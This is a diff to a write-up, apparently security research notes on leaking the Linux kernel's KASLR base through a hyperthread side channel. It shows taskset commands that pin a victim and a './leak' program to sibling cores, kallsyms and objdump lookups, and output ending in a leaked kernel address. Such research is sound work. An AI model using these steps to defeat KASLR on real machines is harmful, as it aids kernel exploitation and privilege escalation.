@@ -3,6 +3,7 @@
 sudo cat /proc/kallsyms | grep do_syscall_64
 ffffffffb9deca90 T do_syscall_64
 
+objdump -d vmlinux.elf
 ffffffff81beca90 <do_syscall_64>:
 ffffffff81beca90:   55                      push   %rbp
 ffffffff81beca91:   49 89 f8                mov    %rdi,%r8
@@ -53,9 +54,10 @@ static __always_inline bool do_syscall_x64(struct pt_regs *regs, int nr) // inli
 2. leak kaslr base!
 
 ```
+# core 35 and core 71 are two logical threads share a same physical core (Intel Hyper-Thread)
 $ taskset -c "35" ./uname & taskset -c "71" ./leak 0xcad0
 
-using suffix 0xcad00
+using suffix 0xcad0
 28 0x1c 1
 082 0x52 1
 129 0x81 7
@@ -68,4 +70,3 @@ leaked_value: ffffffff00decad0
 185 0xb9 20
 leaked_value: ffffffffb9decad0
 ```
-
